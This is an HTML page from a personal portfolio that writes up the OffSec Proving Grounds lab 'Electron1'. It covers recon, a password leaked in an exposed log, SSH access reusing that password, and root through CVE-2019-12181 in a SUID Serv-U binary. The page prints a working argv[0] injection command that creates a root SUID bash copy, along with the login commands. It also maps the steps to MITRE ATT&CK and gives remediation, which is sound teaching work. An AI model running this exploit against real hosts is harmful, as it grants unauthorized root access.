@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Electron1 — Writeup — Dos Vathanak Botra</title>
+<meta name="description" content="An exposed application log leaks plaintext credentials, SSH gets a foothold, and a SUID Serv-U binary vulnerable to CVE-2019-12181 escalates to root. An OffSec Proving Grounds writeup.">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Mono:wght@300;400;500;600&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/base.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/footer.css">
+<link rel="stylesheet" href="../../css/animations.css">
+<link rel="stylesheet" href="../../css/responsive.css">
+<link rel="stylesheet" href="../writeups.css">
+<link rel="stylesheet" href="../../css/fx.css">
+<script src="../../js/fx-head.js"></script>
+</head>
+<body>
+<div class="fx-cube-cap" aria-hidden="true"></div>
+
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <a href="../../index.html" class="nav-logo" aria-label="Status: Junior">
+    <span class="nav-logo-dot" aria-hidden="true"></span>
+    <span class="nav-logo-key">STATUS:</span>
+    <span class="nav-logo-val">JUNIOR</span>
+  </a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="../../index.html#about">About</a></li>
+    <li><a href="../../index.html#skills">Skills</a></li>
+    <li><a href="../../index.html#experience">Experience</a></li>
+    <li><a href="../../index.html#certificates">Certs</a></li>
+    <li><a href="../index.html">Writeups</a></li>
+    <li><a href="../../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" aria-label="Toggle light and dark theme">
+      <span class="theme-toggle-label" id="themeLabel">Dark</span>
+      <span class="theme-toggle-track"><span class="theme-toggle-thumb"></span></span>
+    </button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main class="wu-main">
+  <a href="../index.html" class="wu-back">← All writeups</a>
+
+  <div class="wu-report-head">
+    <span class="badge cat-web">Web</span>
+    <span class="diff diff-medium">Medium</span>
+  </div>
+  <h1 class="wu-page-title">Electron1</h1>
+  <p class="wu-meta-line"><b>OffSec Proving Grounds</b> · Linux · eLection CMS · boot-to-root</p>
+
+  <!-- At a glance -->
+  <dl class="wu-glance reveal">
+    <div><dt>Vulnerability</dt><dd>Exposed log → leaked creds → SSH → SUID Serv-U (CVE-2019-12181)</dd></div>
+    <div><dt>Impact</dt><dd>Full compromise — user and root flags captured (2/2)</dd></div>
+    <div><dt>Tools</dt><dd>nmap, gobuster, curl, sshpass, searchsploit, gcc</dd></div>
+    <div><dt>Given</dt><dd>A single IP, no credentials</dd></div>
+  </dl>
+
+  <div class="wu-flag-wrap">
+    FLAGS&nbsp; <span class="wu-flag-redacted">✓ user + root captured — values redacted</span>
+  </div>
+
+  <!-- Cyber Kill Chain -->
+  <div class="wu-kill-chain">
+    <div class="wu-kill-chain-title">Cyber Kill Chain</div>
+    <div class="wu-chain">
+      <div class="wu-chain-box" data-phase="recon"><span class="step-name">Reconnaissance</span><span class="step-detail">nmap, gobuster</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="credential"><span class="step-name">Credential Access</span><span class="step-detail">exposed system.log</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="exploit"><span class="step-name">Initial Access</span><span class="step-detail">SSH as love</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="privesc"><span class="step-name">Privilege Escalation</span><span class="step-detail">SUID Serv-U argv[0] injection</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="impact"><span class="step-name">Impact</span><span class="step-detail">root access</span></div>
+    </div>
+  </div>
+
+  <!-- MITRE ATT&CK Framework -->
+  <div class="wu-mitre-table">
+    <h2 style="border-left: 3px solid var(--green); padding-left: 0.85rem; color: var(--text); margin-bottom: 1rem;">MITRE ATT&CK Mapping</h2>
+    <table class="wu-table">
+      <thead>
+        <tr>
+          <th>Tactic</th>
+          <th>Technique</th>
+          <th>ID</th>
+          <th>Evidence</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Discovery</strong></td>
+          <td>Active Scanning: Wordlist Scanning</td>
+          <td><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" rel="noopener" style="color: var(--cyan);">T1595.003</a></td>
+          <td>gobuster found the <code>/election/</code> app and a directory-listed <code>/admin/logs/</code></td>
+        </tr>
+        <tr>
+          <td><strong>Credential Access</strong></td>
+          <td>Unsecured Credentials: Credentials In Files</td>
+          <td><a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" rel="noopener" style="color: var(--cyan);">T1552.001</a></td>
+          <td>A world-readable <code>system.log</code> disclosed a plaintext account password</td>
+        </tr>
+        <tr>
+          <td><strong>Initial Access</strong></td>
+          <td>Valid Accounts: Local Accounts / Remote Services: SSH</td>
+          <td><a href="https://attack.mitre.org/techniques/T1078/003/" target="_blank" rel="noopener" style="color: var(--cyan);">T1078.003</a> + <a href="https://attack.mitre.org/techniques/T1021/004/" target="_blank" rel="noopener" style="color: var(--cyan);">T1021.004</a></td>
+          <td>The leaked CMS password was reused for the system account over SSH</td>
+        </tr>
+        <tr>
+          <td><strong>Privilege Escalation</strong></td>
+          <td>Exploitation for Privilege Escalation</td>
+          <td><a href="https://attack.mitre.org/techniques/T1068/" target="_blank" rel="noopener" style="color: var(--cyan);">T1068</a></td>
+          <td>CVE-2019-12181 — argv[0] command injection against a SUID-root Serv-U binary</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Vulnerability Analysis -->
+  <div class="wu-vuln-analysis">
+    <h3>Vulnerability Analysis</h3>
+    <p><strong>Root Causes:</strong> An application wrote a credential into a log that was then served over the web, that credential was reused for a shell account, and a leftover SUID binary carried a known local-privilege-escalation CVE.</p>
+    <ul style="color: var(--text2); margin-left: 1.3rem;">
+      <li><strong>CWE-532: Insertion of Sensitive Information into Log File</strong> — the eLection app logged a user's password in cleartext</li>
+      <li><strong>CWE-548: Exposure of Information Through Directory Listing</strong> — the <code>/admin/logs/</code> directory was browsable, exposing <code>system.log</code></li>
+      <li><strong>CWE-522: Insufficiently Protected Credentials</strong> — the same password protected both the CMS and the SSH account</li>
+      <li><strong>CWE-78: Improper Neutralization of Special Elements used in an OS Command</strong> — CVE-2019-12181 in Serv-U &lt; 15.1.7</li>
+    </ul>
+    <p style="margin-top: 1rem;"><strong>Severity:</strong> The privilege-escalation step maps to <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12181" target="_blank" rel="noopener">CVE-2019-12181</a> — CVSS v3.1 base <strong>7.8 (High)</strong>. The information-disclosure and credential-reuse issues are lab misconfigurations with no scored CVSS; their combined effect is unauthenticated-to-root.</p>
+    <p><strong>References:</strong>
+      <br><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12181" class="cve-link" target="_blank" rel="noopener">CVE-2019-12181</a>
+      <a href="https://cwe.mitre.org/data/definitions/532.html" class="cve-link" target="_blank" rel="noopener">CWE-532</a>
+      <a href="https://cwe.mitre.org/data/definitions/548.html" class="cve-link" target="_blank" rel="noopener">CWE-548</a>
+      <a href="https://cwe.mitre.org/data/definitions/522.html" class="cve-link" target="_blank" rel="noopener">CWE-522</a>
+    </p>
+  </div>
+
+  <div class="wu-body">
+
+    <h2>Summary</h2>
+    <p>Electron1 is a Linux host exposing SSH and an Apache server that hosts the <strong>eLection</strong> web
+    application. Directory brute-forcing uncovered the app's admin area with <strong>directory listing enabled</strong>
+    on its log folder; the exposed <code>system.log</code> contained a user's password in cleartext. That
+    password had been reused for the matching system account, so it logged straight in over SSH. From that
+    foothold, a non-standard SUID-root copy of the <strong>Serv-U</strong> file server (v15.1.6) was vulnerable
+    to <strong>CVE-2019-12181</strong> — an <code>argv[0]</code> command injection via
+    <code>-prepareinstallation</code> — which produced a root shell.</p>
+
+    <div class="wu-insight">
+      <p><strong>Key insight:</strong> the whole foothold hinges on a single logged password. Applications that
+      write secrets into logs, plus a webserver that lists those logs, is unauthenticated credential disclosure
+      — no exploit required.</p>
+    </div>
+
+    <h2>Recon</h2>
+    <p>A service scan plus a full-port scan confirmed only SSH (22) and HTTP (80):</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>nmap -sC -sV &lt;target&gt;
+nmap -p- --min-rate 5000 &lt;target&gt;</code></pre>
+    </div>
+
+    <table class="wu-table">
+      <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+      <tbody>
+        <tr><td>22</td><td>SSH</td><td>OpenSSH 7.6p1 (Ubuntu)</td></tr>
+        <tr><td>80</td><td>HTTP</td><td>Apache 2.4.29 (Ubuntu)</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Web enumeration</h2>
+    <p>The web root served only the default Apache page, but gobuster plus <code>robots.txt</code> pointed at an
+    <code>/election/</code> directory. A <code>phpinfo.php</code> was also exposed, confirming a permissive PHP
+    config (<code>allow_url_include = On</code>, shell functions not disabled) — useful context, though the real
+    way in came from the app's logs.</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>gobuster dir -u http://&lt;target&gt;/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+gobuster dir -u http://&lt;target&gt;/election/admin/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+    </div>
+
+    <p>The admin area's <code>/logs/</code> directory had <strong>directory listing enabled</strong>, exposing a
+    single <code>system.log</code>.</p>
+
+    <h2>Credential access — exposed log</h2>
+    <p>Fetching the log revealed an account password written in cleartext by the application:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>text · system.log</span><button class="wu-copy">copy</button></div>
+<pre><code>[2020-01-01 00:00:00] Assigned Password for the user love: &lt;redacted&gt;
+[2020-04-03 00:13:53] Love added candidate 'Love'.
+[2020-04-08 19:26:34] Love has been logged in ...</code></pre>
+    </div>
+
+    <div class="wu-insight">
+      <p><strong>Why this matters:</strong> a password in a log file is a password in cleartext storage. Served
+      over HTTP with no auth and directory listing on, it's handed to any visitor.</p>
+    </div>
+
+    <h2>Initial access — SSH</h2>
+    <p>The leaked CMS password was reused for the <code>love</code> system account, so SSH logged straight in and
+    the user flag was readable in the home directory:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>sshpass -p '&lt;redacted&gt;' ssh -o StrictHostKeyChecking=no love@&lt;target&gt; 'id; cat ~/local.txt'
+# uid=1000(love) ... groups=...,33(www-data),4(adm)
+# &lt;user flag redacted&gt;</code></pre>
+    </div>
+
+    <h2>Privilege escalation — SUID Serv-U (CVE-2019-12181)</h2>
+    <p>Enumerating SUID binaries surfaced a non-standard one: <code>/usr/local/Serv-U/Serv-U</code>, SUID root.
+    <code>strings</code> and a nearby installer confirmed <strong>Serv-U 15.1.6</strong>, which
+    <code>searchsploit</code> flagged as vulnerable to CVE-2019-12181:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
+# ...
+# /usr/local/Serv-U/Serv-U   &lt;=== SUID root, non-standard
+searchsploit serv-u 15.1
+# Serv-U FTP Server &lt; 15.1.7 - Local Privilege Escalation  (CVE-2019-12181)</code></pre>
+    </div>
+
+    <p>The vulnerability runs whatever is passed as <code>argv[0]</code> as a shell command when the binary is
+    invoked with <code>-prepareinstallation</code>. Because the binary is SUID root, that command runs as root.
+    Bash's <code>exec -a</code> sets <code>argv[0]</code> to a payload that makes a root-owned SUID copy of
+    <code>bash</code>:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>/bin/bash -c 'exec -a "\";cp /bin/bash /tmp/sh; chown root /tmp/sh; chmod u+sx /tmp/sh;\"" \
+  /usr/local/Serv-U/Serv-U -prepareinstallation'
+
+/tmp/sh -p -c 'id; cat /root/proof.txt'
+# uid=1000(love) euid=0(root) ...
+# &lt;root flag redacted&gt;</code></pre>
+    </div>
+
+    <p>The "Permission denied" noise from the injected string is expected — the payload inside
+    <code>argv[0]</code> still executes as root, leaving a <code>euid=0</code> shell that reads the root flag.</p>
+
+    <div class="wu-insight">
+      <p><strong>Note on method:</strong> a first attempt with <code>LD_PRELOAD</code> failed — the kernel strips
+      it for SUID binaries by design. The working primitive is the binary's own <code>argv[0]</code> handling,
+      not the environment.</p>
+    </div>
+
+    <h2>Findings &amp; remediation</h2>
+    <table class="wu-table">
+      <thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Application logs a password in cleartext</td><td>High</td><td>Never log secrets; redact credentials before writing to any log</td></tr>
+        <tr><td>2</td><td>Directory listing enabled on <code>/admin/logs/</code></td><td>Medium</td><td>Disable auto-indexing (<code>Options -Indexes</code>); keep logs out of the webroot</td></tr>
+        <tr><td>3</td><td>CMS password reused for the SSH account</td><td>High</td><td>Unique credentials per system; enforce key-based SSH auth</td></tr>
+        <tr><td>4</td><td>Exposed <code>phpinfo.php</code> with permissive PHP config</td><td>Medium</td><td>Remove <code>phpinfo</code> from production; disable <code>allow_url_include</code></td></tr>
+        <tr><td>5</td><td>SUID-root Serv-U 15.1.6 (CVE-2019-12181)</td><td>Critical</td><td>Patch to Serv-U ≥ 15.1.7 and remove the SUID bit; no file server needs SUID root</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Takeaways</h2>
+    <ul>
+      <li><strong>Logs are loot.</strong> The entire foothold was one line in a web-exposed log file.</li>
+      <li><strong>Reuse multiplies a single leak.</strong> One password opened both the app and the OS account.</li>
+      <li><strong>Read the exploit, don't just run it.</strong> The win was understanding <em>why</em>
+      <code>LD_PRELOAD</code> fails on SUID and that <code>argv[0]</code> was the real injection point.</li>
+    </ul>
+
+  </div>
+
+  <!-- References & Standards Alignment -->
+  <div class="wu-references">
+    <h3>References & Standards</h3>
+    <ul>
+      <li class="ref-category">MITRE Framework</li>
+      <li><a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&CK — Adversary Tactics, Techniques, and Common Knowledge</a></li>
+
+      <li class="ref-category">Vulnerability &amp; Weakness</li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12181" target="_blank" rel="noopener">CVE-2019-12181 — Serv-U &lt; 15.1.7 Local Privilege Escalation</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/532.html" target="_blank" rel="noopener">CWE-532: Insertion of Sensitive Information into Log File</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/548.html" target="_blank" rel="noopener">CWE-548: Exposure of Information Through Directory Listing</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/522.html" target="_blank" rel="noopener">CWE-522: Insufficiently Protected Credentials</a></li>
+
+      <li class="ref-category">Security Guidance</li>
+      <li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins — abusing SUID binaries and local privilege escalation</a></li>
+      <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10 — Most Critical Web Application Security Risks</a></li>
+      <li><a href="https://www.cisecurity.org/cis-benchmarks/" target="_blank" rel="noopener">CIS Benchmarks — Security Configuration Standards</a></li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-name">DOS VATHANAK BOTRA</div>
+  <div class="footer-copy">© 2025 Dos Vathanak Botra. All rights reserved. · Phnom Penh, Cambodia</div>
+  <div class="footer-links">
+    <a href="../../index.html#hero">Home</a>
+    <a href="../index.html">Writeups</a>
+    <a href="../../index.html#contact">Contact</a>
+  </div>
+</footer>
+
+<script src="../../js/theme.js"></script>
+<script src="../../js/nav.js"></script>
+<script src="../../js/fx.js"></script>
+<script src="../writeups.js"></script>
+<script src="../../js/analytics.js"></script>
+</body>
+</html>
